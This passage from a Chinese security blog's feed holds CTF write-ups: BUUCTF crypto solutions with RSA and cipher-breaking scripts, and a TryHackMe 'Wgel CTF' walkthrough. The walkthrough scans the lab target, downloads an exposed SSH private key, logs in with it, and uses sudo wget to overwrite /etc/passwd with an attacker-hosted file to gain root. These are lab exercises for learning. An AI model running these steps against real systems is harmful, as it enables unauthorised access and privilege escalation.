gmpy2p=9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e=65537c=83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034gmpy2.mpz(p)gmpy2.mpz(q)n = (p-1)*(q-1)d = gmpy2.invert(e,n)N=p*qm=gmpy2.powmod(c,d,N)flag=str(m)print("flag{"+flag+"}")</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110202420717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h1><p>凯撒大帝，发现可以组成一个单词<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110203527615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>向量为13，加密密文：ComeChina</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110203606733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>P换为大写</p><h1 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h1><p>拿ctf用户的hash进行md5解密，第二段解密成功<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110203848664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110203816751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="BJDCTF-2nd-cat-flag"><a href="#BJDCTF-2nd-cat-flag" class="headerlink" title="[BJDCTF 2nd]cat_flag"></a>[BJDCTF 2nd]cat_flag</h1><p>参考其他师傅的<a href="https://blog.csdn.net/MikeCoke/article/details/106099493" target="_blank" rel="noopener">WP</a></p><h1 id="BJDCTF-2nd-燕言燕语-y1ng"><a href="#BJDCTF-2nd-燕言燕语-y1ng" class="headerlink" title="[BJDCTF 2nd]燕言燕语-y1ng"></a>[BJDCTF 2nd]燕言燕语-y1ng</h1><p>十六进制转换字符，在进行维吉尼亚解密<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110204550330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110204835786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h1><p>参考其他师傅的<a href="https://blog.csdn.net/mikecoke/article/details/105903750" target="_blank" rel="noopener">WP</a></p><h1 id="GKCTF2020-小学生的密码学"><a href="#GKCTF2020-小学生的密码学" class="headerlink" title="[GKCTF2020]小学生的密码学"></a>[GKCTF2020]小学生的密码学</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111020541575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="信息化时代的步伐"><a href="#信息化时代的步伐" class="headerlink" title="信息化时代的步伐"></a>信息化时代的步伐</h1><p>参考其他师傅的<a href="https://blog.csdn.net/MikeCoke/article/details/106101027" target="_blank" rel="noopener">WP</a></p><h1 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h1><p>已知p,q,dp,dq,c求m<br>脚本：</p><pre><code>import gmpy2import binasciidef decrypt(dp,dq,p,q,c):        InvQ = gmpy2.invert(q,p)        mp = pow(c,dp,p)        mq = pow(c,dq,q)        m=(((mp-mq)*InvQ)%p)*q+mq        temp_flag=binascii.unhexlify(hex(m)[2:])        print(temp_flag)p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp,dq,p,q,c)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110210622881.png#pic_center" alt=""></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>某一次比赛中以为是凯撒，但是解不出，赛后看其他队的wp才知道是<a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a>.<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110211308285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>转为小写去掉空格再提交<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110211359624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="old-fashion"><a href="#old-fashion" class="headerlink" title="old-fashion"></a>old-fashion</h1><p>还是词频分析<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110211924968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="BJDCTF-2nd-灵能精通-y1ng"><a href="#BJDCTF-2nd-灵能精通-y1ng" class="headerlink" title="[BJDCTF 2nd]灵能精通-y1ng"></a>[BJDCTF 2nd]灵能精通-y1ng</h1><p>flag{IMKNIGHTSTEMPLAR}<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110212316808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="权限获得第一步"><a href="#权限获得第一步" class="headerlink" title="权限获得第一步"></a>权限获得第一步</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110212857796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="萌萌哒的八戒"><a href="#萌萌哒的八戒" class="headerlink" title="萌萌哒的八戒"></a>萌萌哒的八戒</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110213640605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h1><p>从pub.key中提取n,e<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110214242702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>得到n去提取p，q，网站：<a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111021470863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>得到p,q,n,e求d以及解密flag文件<br>p=285960468890451637935629440372639283459<br>q=304008741604601924494328155975272418463<br>e=65537<br>n=8693448229604811919066606200349480058890565601720302561721665405<br>8378322103517</p><p>脚本：</p><pre><code>import gmpy2import rsae = 65537n = 86934482296048119190666062003494800588905656017203025617216654058378322103517p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463phin = (q-1)*(p-1)d = gmpy2.invert(e, phin)key = rsa.PrivateKey(n, e, int(d), p, q)with open("flag.enc", "rb+") as f:    f = f.read()    print(rsa.decrypt(f, key))</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110215416572.png#pic_center" alt=""></p><h1 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h1><p> <a href="https://blog.csdn.net/mikecoke/article/details/105967809" target="_blank" rel="noopener">参考</a>.</p><p>e = 65537<br>n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113<br>dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</p><p>c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</p><p>脚本：</p><pre><code>import gmpy2 as gpe = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751for i in range(1,e):                   #在范围(1,e)之间进行遍历    if(dp*e-1)%i == 0:        if n%(((dp*e-1)//i)+1) == 0:   #存在p，使得n能被p整除            p=((dp*e-1)//i)+1            q=n//(((dp*e-1)//i)+1)            phi=(q-1)*(p-1)            #欧拉定理            d=gp.invert(e,phi)         #求模逆            m=pow(c,d,n)               #快速求幂取模运算print(m)                               #10进制明文print('------------')print(hex(m)[2:])                      #16进制明文print('------------')print(bytes.fromhex(hex(m)[2:]))       #16进制转文本</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110220007953.png#pic_center" alt=""></p><h1 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h1><p><a href="https://www.cnblogs.com/CH42e/p/11990740.html" target="_blank" rel="noopener">参考</a></p><h1 id="BJDCTF-2nd-Y1nglish-y1ng"><a href="#BJDCTF-2nd-Y1nglish-y1ng" class="headerlink" title="[BJDCTF 2nd]Y1nglish-y1ng"></a>[BJDCTF 2nd]Y1nglish-y1ng</h1><p>也是词频分析<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111022230718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}把最后一个y改为k</p><h1 id="世上无难事"><a href="#世上无难事" class="headerlink" title="世上无难事"></a>世上无难事</h1><p>还是词频分析<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110222736842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>转为小写<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111022282391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h1><p>异或字符<br>脚本:</p><pre><code>with open('密文.txt' )as a:    a=a.read()with open('key.txt' )as b:    b=b.read()d=''for i in range(0,len(b)):    c=chr(ord(a[i])^ord(b[i]))    d+=cprint(d)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110223745177.png#pic_center" alt=""></p><h1 id="还原大师"><a href="#还原大师" class="headerlink" title="还原大师"></a>还原大师</h1><pre><code># -*- coding: utf-8 -*-#!/usr/bin/env pythonimport hashlib#print hashlib.md5(s).hexdigest().upper()k = 'TASC?O3RJMV?WDJKX?ZM'for i in range(26):    temp1 = k.replace('?',str(chr(65+i)),1)    for j in range(26):        temp2 = temp1.replace('?',chr(65+j),1)        for n in range(26):            temp3 = temp2.replace('?',chr(65+n),1)            s = hashlib.md5(temp3.encode('utf8')).hexdigest().upper()            if s[:4] == 'E903':                print (s)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110224219731.png#pic_center" alt=""></p><h1 id="GKCTF2020-汉字的秘密"><a href="#GKCTF2020-汉字的秘密" class="headerlink" title="[GKCTF2020]汉字的秘密"></a>[GKCTF2020]汉字的秘密</h1><p>当铺密码 [1]  就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：<br>王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125</p><p>脚本：</p><pre><code>dh = '田口由中人工大土士王夫井羊壮'ds = '00123455567899'cip = '王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫's = ''for i in cip:    if i in dh:        s += ds[dh.index(i)]    else:        s += ' '#print(s)ll = s.split(" ")t = ''for i in range(0,len(ll)):    t += chr(int(ll[i])+i+1)print('t=', t, '\t\tt.lower()=', t.lower())</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110231538260.png#pic_center" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--Wgel CTF</title>
      <link href="/posts/75a2a2j8.html"/>
      <url>/posts/75a2a2j8.html</url>
      
        <content type="html"><![CDATA[<p>这个靶机涉及的知识点有ssh的公钥算法知识和sudo提权常用手法。</p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>简单扫描靶机的服务</p><pre><code>nmap -T4 -sS -sV 10.10.247.24</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023223030736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt="">)深度扫描也没没有什么可以直接利用的漏洞<a id="more"></a>)</p><pre><code>nmap -T4 -sS -sV 10.10.247.24  --script vuln </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020102322464994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>目标机器为linux主机，并且目标主机开放了两个端口：22、80。</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>22</td><td>ssh</td></tr><tr><td>80</td><td>http</td></tr></tbody></table><h1 id="id-rsa信息泄漏"><a href="#id-rsa信息泄漏" class="headerlink" title="id_rsa信息泄漏"></a>id_rsa信息泄漏</h1><p>访问80端口，发现为apache的默认页面，查看页面源代码，发现一句很有趣的话，其中 Jessie 可能为用户名</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023223459738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>用dirsearch扫描站点，发现一个目录，访问进入真正的网站<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023223713729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023223947721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>但是目前除了一个可能的用户名我们没有其他的信息，试着再对其进行深度扫描，发现一个RSA文件，这个文件是ssh登录用户的私钥，有了用户名和私钥我们便可以登录目标主机。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023224119727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>将它下载下来并赋予权限600</p><pre><code>wget http://10.10.247.24/sitemap/.ssh/id_rsachmod 600 id_rsa </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023224546727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>接下来用私钥登录目标主机</p><pre><code>ssh Jessie@10.10.247.24 -i id_rsa </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023224954443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>在jessie的家目录经过一番查找发现user flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023225516291.png#pic_center" alt=""></p><h1 id="wget的sudo提权"><a href="#wget的sudo提权" class="headerlink" title="wget的sudo提权"></a>wget的sudo提权</h1><p>查看当前用户是否可以执行sudo命令，要是不了解sudo命令及其提权原理的可以自行百度。可以看到当前用户可以不用密码以root的身份执行wget命令，wget命令有一个-O选项可以重命名下载的文件，因此我们就可以以root的身份之执行该命令，重命名我们编写好的恶意的/etc/passwd文件，达到覆盖目标主机的密码文件的效果。<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023225610595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>具体过程如下，我们在攻击机上编写一个全新的/etc/passwd文件，将root的密码替换为我们自己的密码，实在不会弄hash就直接用自己kali上的shaow文件中的hsah值。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023230317509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>在攻击机上开启简易的http服务，靶机上下载修改过的密码文件，可以看到目标主机的密码文件已经被替换。</p><pre><code>python -m SimpleHTTPServer //攻击机上执行sudo  -u root /usr/bin/wget http://10.9.xxx.xx:8000/11 -O /etc/passwd  //靶机上执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023231039172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt="">切换root用户，输入我们替换的hash的对应的密码，成功登录，读取最后的flag。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201023231418241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF web新手区wp</title>
      <link href="/posts/7wa2h2e8.html"/>
      <url>/posts/7wa2h2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="XCTF-web新手区wp"><a href="#XCTF-web新手区wp" class="headerlink" title="XCTF web新手区wp"></a>XCTF web新手区wp</h1><p>1、view_source</p><p>F12查看页面源码，发现flag。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110221332942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><a id="more"></a>)<p>2、robots</p><p>看题目知道robots.txt里面应该有我们想要的东西-flag（robots.txt可以禁止网络爬虫爬取特定目录）。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213349919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>3、backup</p><p>熟悉常见的备份文件扩展名，逐个测试，最终备份文件为：index.php.bak</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102213413886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>4、cookie</p><p>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“<strong>小型文本文件</strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a 